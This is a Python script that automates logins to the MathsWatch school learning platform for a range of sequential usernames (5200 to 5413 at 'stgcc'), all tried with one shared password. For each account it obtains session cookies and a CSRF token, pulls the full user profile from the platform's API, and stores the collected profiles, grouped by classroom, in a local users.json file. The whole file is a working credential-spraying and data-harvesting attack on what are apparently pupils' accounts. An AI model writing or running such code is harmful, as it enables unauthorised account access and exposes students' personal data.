from getcookies import getcookies
from login import login
from logout import logout
from main import PASSWORD, INFO, SUCCESS, DANGER, console

import requests
import json
import os


def recon(
    username: str,
) -> None:
    """
    Login to an account and return user info.
    :param username: The username of the account.
    """

    console.print("[*] Starting the script...", style=INFO)

    console.print("[*] Getting cookies...", style=INFO)
    cookies = getcookies(username, PASSWORD)

    console.print("[*] Logging in...", style=INFO)
    login_info = login(cookies["connect.sid"], cookies["_csrf"], username, PASSWORD)
    console.print(f"[+] Login status: {login_info}", style=SUCCESS)

    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://vle.mathswatch.co.uk",
        "priority": "u=1, i",
        "referer": "https://vle.mathswatch.co.uk/vle/",
        "cookie": f"connect.sid={cookies['connect.sid']}",
        "x-csrf-token": cookies["_csrf"],
    }

    request = requests.request(
        "GET", "https://vle.mathswatch.co.uk/duocms/api/users/me", headers=headers
    )
    try:
        response = json.loads(request.text.replace("'", '"'))
    except Exception as e:
        console.print(
            f"[!] Error: Could not get user data. Reason: {e} & {request.text}\n[i]Skipping User[/]",
            style=DANGER,
        )
        return None

    console.print(
        f"[*] User data received. Status: {request.status_code}",
        style=INFO,
    )

    if request.status_code != 200:
        console.print(
            f"[!] Error {request.status_code}: Could not get user data. Reason: {request.text}\n[i]Skipping User[/]",
            style=DANGER,
        )
        return None

    console.print("[*] Updating file...", style=INFO)

    user_data = response["data"]
    classrooms = user_data.get("classrooms", [])

    # Load existing data if the file exists
    if os.path.exists("users.json"):
        with open("users.json", "r") as file:
            existing_data = json.load(file)
    else:
        existing_data = {}

    # Update or add the user data grouped by classrooms
    for classroom in classrooms:
        class_name = classroom["name"]
        if class_name not in existing_data:
            existing_data[class_name] = []

        # Check if user already exists in the class
        user_found = False
        for existing_user in existing_data[class_name]:
            if existing_user["id"] == user_data["id"]:
                existing_user.update(user_data)
                user_found = True
                break

        if not user_found:
            existing_data[class_name].append(user_data)

    # Write updated data to the JSON file
    with open("users.json", "w") as file:
        json.dump(existing_data, file, indent=4)

    console.print("[+] File updated", style=SUCCESS)

    console.print("[*] Logging out...", style=INFO)
    logout(cookies["connect.sid"], cookies["_csrf"])
    console.print("[+] Logged out", style=SUCCESS)

    return None


def main():
    for i in range(5200, 5414):
        recon(f"{i}@stgcc")

        # time.sleep(1)
        print(console.rule())


if __name__ == "__main__":
    main()
